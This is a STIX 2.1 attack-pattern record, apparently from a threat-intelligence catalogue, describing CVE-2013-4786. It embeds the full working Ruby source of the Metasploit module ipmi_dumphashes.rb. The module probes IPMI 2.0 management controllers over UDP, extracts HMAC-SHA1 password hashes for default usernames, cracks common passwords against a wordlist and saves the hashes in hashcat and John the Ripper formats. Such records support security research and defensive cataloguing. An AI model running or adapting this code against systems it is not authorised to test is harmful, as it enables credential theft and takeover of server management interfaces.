{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--eed3d9db-915f-4fec-b7a7-a4ab62864828",
    "created": "2024-08-14T16:28:22.325708Z",
    "modified": "2024-08-14T16:28:22.325712Z",
    "name": "IPMI 2.0 RAKP Remote SHA1 Password Hash Retrieval",
    "description": "| This module identifies IPMI 2.0-compatible systems and attempts to retrieve the HMAC-SHA1 password hashes of default usernames. The hashes can be stored in a file using the OUTPUT_FILE option and then cracked using hmac_sha1_crack.rb in the tools subdirectory as well hashcat (cpu) 0.46 or newer using type 7300. |",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/ipmi/ipmi_dumphashes.rb",
            "external_id": "ipmi_dumphashes.rb"
        },
        {
            "source_name": "reference",
            "url": "http://fish2.com/ipmi/remote-pw-cracking.html"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-4786"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'        => 'IPMI 2.0 RAKP Remote SHA1 Password Hash Retrieval',\n      'Description' => %q|\n        This module identifies IPMI 2.0-compatible systems and attempts to retrieve the\n        HMAC-SHA1 password hashes of default usernames. The hashes can be stored in a\n        file using the OUTPUT_FILE option and then cracked using hmac_sha1_crack.rb\n        in the tools subdirectory as well hashcat (cpu) 0.46 or newer using type 7300.\n        |,\n      'Author'      => [ 'Dan Farmer <zen[at]fish2.com>', 'hdm' ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          ['URL', 'http://fish2.com/ipmi/remote-pw-cracking.html'],\n          ['URL', 'https://seclists.org/bugtraq/2014/Apr/16'], # HP's SSRT101367\n          ['CVE', '2013-4786'],\n          ['OSVDB', '95057'],\n          ['BID', '61076'],\n        ],\n      'DisclosureDate' => 'Jun 20 2013'\n    )\n\n    register_options(\n    [\n      Opt::RPORT(623),\n      OptPath.new('USER_FILE', [ true, \"File containing usernames, one per line\",\n        File.join(Msf::Config.install_root, 'data', 'wordlists', 'ipmi_users.txt')\n      ]),\n      OptPath.new('PASS_FILE', [ true, \"File containing common passwords for offline cracking, one per line\",\n        File.join(Msf::Config.install_root, 'data', 'wordlists', 'ipmi_passwords.txt')\n      ]),\n      OptString.new('OUTPUT_HASHCAT_FILE', [false, \"Save captured password hashes in hashcat format\"]),\n      OptString.new('OUTPUT_JOHN_FILE', [false, \"Save captured password hashes in john the ripper format\"]),\n      OptBool.new('CRACK_COMMON', [true, \"Automatically crack common passwords as they are obtained\", true]),\n      OptInt.new('SESSION_RETRY_DELAY', [true, \"Delay between session retries in seconds\", 5]),\n      OptInt.new('SESSION_MAX_ATTEMPTS', [true, \"Maximum number of session retries, required on certain BMCs (HP iLO 4, etc)\", 5])\n    ])\n\n  end\n\n  def post_auth?\n    true\n  end\n\n  def ipmi_status(msg)\n    vprint_status(\"#{rhost}:#{rport} - IPMI - #{msg}\")\n  end\n\n  def ipmi_error(msg)\n    vprint_error(\"#{rhost}:#{rport} - IPMI - #{msg}\")\n  end\n\n  def ipmi_good(msg)\n    print_good(\"#{rhost}:#{rport} - IPMI - #{msg}\")\n  end\n\n  def run_host(ip)\n\n    ipmi_status(\"Sending IPMI probes\")\n\n    usernames = []\n    passwords = []\n\n    # Load up our username list (save on open fds)\n    ::File.open(datastore['USER_FILE'], \"rb\") do |fd|\n      fd.each_line do |line|\n        usernames << line.strip\n      end\n    end\n    usernames << \"\"\n    usernames = usernames.uniq\n\n    # Load up our password list (save on open fds)\n    ::File.open(datastore['PASS_FILE'], \"rb\") do |fd|\n      fd.each_line do |line|\n        passwords << line.gsub(/\\r?\\n?/, '')\n      end\n    end\n    passwords << \"\"\n    passwords = passwords.uniq\n\n    delay_value = datastore['SESSION_RETRY_DELAY'].to_i\n    max_session_attempts = datastore['SESSION_MAX_ATTEMPTS'].to_i\n\n    self.udp_sock = Rex::Socket::Udp.create({'Context' => {'Msf' => framework, 'MsfExploit' => self}})\n    add_socket(self.udp_sock)\n\n    reported_vuln = false\n    session_succeeded = false\n\n    usernames.each do |username|\n      console_session_id = Rex::Text.rand_text(4)\n      console_random_id  = Rex::Text.rand_text(16)\n\n      ipmi_status(\"Trying username '#{username}'...\")\n\n      rakp = nil\n      sess = nil\n      sess_data = nil\n\n      # It may take multiple tries to get a working \"session\" on certain BMCs (HP iLO 4, etc)\n      1.upto(max_session_attempts) do |attempt|\n\n        r = nil\n        1.upto(3) do\n          udp_send(Rex::Proto::IPMI::Utils.create_ipmi_session_open_request(console_session_id))\n          r = udp_recv(5.0)\n          break if r\n        end\n\n        unless r\n          ipmi_status(\"No response to IPMI open session request\")\n          rakp = nil\n          break\n        end\n\n        sess = process_opensession_reply(*r)\n        unless sess\n          ipmi_status(\"Could not understand the response to the open session request\")\n          rakp = nil\n          break\n        end\n\n        if sess.data.length < 8\n          ipmi_status(\"Refused IPMI open session request, waiting #{delay_value} seconds\")\n          rakp = nil\n          sleep(delay_value) if session_succeeded\n          next # break\n        end\n\n        session_succeeded = true\n\n        sess_data = Rex::Proto::IPMI::Session_Data.new.read(sess.data)\n\n        r = nil\n        1.upto(3) do\n          udp_send(Rex::Proto::IPMI::Utils.create_ipmi_rakp_1(sess_data.bmc_session_id, console_random_id, username))\n          r = udp_recv(5.0)\n          break if r\n        end\n\n        unless r\n          ipmi_status(\"No response to RAKP1 message\")\n          next\n        end\n\n        rakp = process_rakp1_reply(*r)\n        unless rakp\n          ipmi_status(\"Could not understand the response to the RAKP1 request\")\n          rakp = nil\n          break\n        end\n\n        # Sleep and retry on session ID errors\n        if rakp.error_code == 2\n          ipmi_error(\"Returned a Session ID error for username #{username} on attempt #{attempt}\")\n          Rex.sleep(1)\n          next\n        end\n\n        if rakp.error_code != 0\n          ipmi_error(\"Returned error code #{rakp.error_code} for username #{username}: #{Rex::Proto::IPMI::RMCP_ERRORS[rakp.error_code].to_s}\")\n          rakp = nil\n          break\n        end\n\n        # TODO: Finish documenting this error field\n        if rakp.ignored1 != 0\n          ipmi_error(\"Returned error code #{rakp.ignored1} for username #{username}\")\n          rakp = nil\n          break\n        end\n\n        # Check if there is hash data\n        if rakp.data.length < 56\n          rakp = nil\n          break\n        end\n\n        # Break out of the session retry code if we make it here\n        break\n      end\n\n      # Skip to the next user if we didnt get a valid response\n      next if !rakp\n\n      # Calculate the salt used in the hmac-sha1 hash\n      rakp_data = Rex::Proto::IPMI::RAKP2_Data.new.read(rakp.data)\n      hmac_buffer = Rex::Proto::IPMI::Utils.create_rakp_hmac_sha1_salt(\n        console_session_id,\n        sess_data.bmc_session_id,\n        console_random_id,\n        rakp_data.bmc_random_id,\n        rakp_data.bmc_guid,\n        0x14,\n        username\n      )\n\n      sha1_salt = hmac_buffer.unpack(\"H*\")[0]\n      sha1_hash = rakp_data.hmac_sha1.unpack(\"H*\")[0]\n\n      if sha1_hash == \"0000000000000000000000000000000000000000\"\n        ipmi_error(\"Returned a bogus SHA1 hash for username #{username}\")\n        next\n      end\n\n      ipmi_good(\"Hash found: #{username}:#{sha1_salt}:#{sha1_hash}\")\n\n      write_output_files(rhost, username, sha1_salt, sha1_hash)\n\n      # Write the rakp hash to the database\n      hash = \"#{rhost} #{username}:$rakp$#{sha1_salt}$#{sha1_hash}\"\n      core_id = report_hash(username, hash)\n      # Write the vulnerability to the database\n      unless reported_vuln\n        report_vuln(\n          :host  => rhost,\n          :port  => rport,\n          :proto => 'udp',\n          :sname => 'ipmi',\n          :name  => 'IPMI 2.0 RMCP+ Authentication Password Hash Exposure',\n          :info  => \"Obtained password hash for user #{username}: #{sha1_salt}:#{sha1_hash}\",\n          :refs  => self.references\n        )\n        reported_vuln = true\n      end\n\n      # Offline crack common passwords and report clear-text credentials\n      next unless datastore['CRACK_COMMON']\n\n      passwords.uniq.each do |pass|\n        pass = pass.strip\n        next unless pass.length > 0\n        next unless Rex::Proto::IPMI::Utils.verify_rakp_hmac_sha1(hmac_buffer, rakp_data.hmac_sha1, pass)\n        ipmi_good(\"Hash for user '#{username}' matches password '#{pass}'\")\n\n        # Report the clear-text credential to the database\n        report_cracked_cred(username, pass, core_id)\n        break\n      end\n    end\n  end\n\n  def process_opensession_reply(data, shost, sport)\n    shost = shost.sub(/^::ffff:/, '')\n    info = Rex::Proto::IPMI::Open_Session_Reply.new.read(data) rescue nil\n    return unless info && info.session_payload_type == Rex::Proto::IPMI::PAYLOAD_RMCPPLUSOPEN_REP\n    info\n  end\n\n  def process_rakp1_reply(data, shost, sport)\n    shost = shost.sub(/^::ffff:/, '')\n    info = Rex::Proto::IPMI::RAKP2.new.read(data) rescue nil\n    return unless info && info.session_payload_type == Rex::Proto::IPMI::PAYLOAD_RAKP2\n    info\n  end\n\n\n  def write_output_files(rhost, username, sha1_salt, sha1_hash)\n    if datastore['OUTPUT_HASHCAT_FILE']\n      ::File.open(datastore['OUTPUT_HASHCAT_FILE'], \"ab\") do |fd|\n        fd.write(\"#{rhost} #{username}:#{sha1_salt}:#{sha1_hash}\\n\")\n        fd.flush\n      end\n    end\n\n    if datastore['OUTPUT_JOHN_FILE']\n      ::File.open(datastore['OUTPUT_JOHN_FILE'], \"ab\") do |fd|\n        fd.write(\"#{rhost} #{username}:$rakp$#{sha1_salt}$#{sha1_hash}\\n\")\n        fd.flush\n      end\n    end\n  end\n\n  def service_data\n    {\n      address: rhost,\n      port: rport,\n      service_name: 'ipmi',\n      protocol: 'udp',\n      workspace_id: myworkspace_id\n    }\n  end\n\n  def report_hash(user, hash)\n    credential_data = {\n      module_fullname: self.fullname,\n      origin_type: :service,\n      private_data: hash,\n      private_type: :nonreplayable_hash,\n      jtr_format: 'rakp',\n      username: user,\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::UNTRIED\n    }.merge(service_data)\n\n    cl = create_credential_login(login_data)\n    cl ? cl.core_id : nil\n  end\n\n  def report_cracked_cred(user, password, core_id)\n    cred_data = {\n      core_id: core_id,\n      username: user,\n      password: password\n    }\n\n    create_cracked_credential(cred_data)\n  end\n\n  #\n  # Helper methods (these didn't quite fit with existing mixins)\n  #\n\n  attr_accessor :udp_sock\n\n  def udp_send(data)\n    begin\n      udp_sock.sendto(data, rhost, datastore['RPORT'], 0)\n    rescue ::Interrupt\n      raise $!\n    rescue ::Exception\n    end\n  end\n\n  def udp_recv(timeo)\n    r = udp_sock.recvfrom(65535, timeo)\n    r[1] ? r : nil\n  end\n\n  def rhost\n    datastore['RHOST']\n  end\n\n  def rport\n    datastore['RPORT']\n  end\nend\n",
    "x_mitre_disclosure_date": "Jun 20 2013"
}